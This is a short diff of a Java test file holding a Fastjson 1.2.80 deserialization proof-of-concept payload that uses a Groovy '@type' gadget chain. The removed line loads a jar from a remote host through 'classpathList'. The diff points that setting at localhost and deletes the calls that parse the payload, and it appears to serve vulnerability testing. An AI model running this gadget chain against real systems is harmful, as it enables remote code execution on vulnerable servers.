@@ -18,14 +18,12 @@ public class Fastjson1280ApplicationTest {
                 "  \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                 "  \"config\":{\n" +
                 "    \"@type\": \"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
-                "    \"classpathList\":\"http://192.168.3.118:81/misc-classes.jar\"\n" +
+                "    \"classpathList\":\"http://127.0.0.1:81/\"\n" +
                 "  },\n" +
                 "  \"gcl\":null,\n" +
                 "  \"destDir\": \"/tmp\"\n" +
                 "}";
         System.out.println(fj_poc_step1);
         System.out.println(fj_poc_step2);
-        JSON.parseObject(fj_poc_step1);
-        JSON.parseObject(fj_poc_step2);
     }
 }
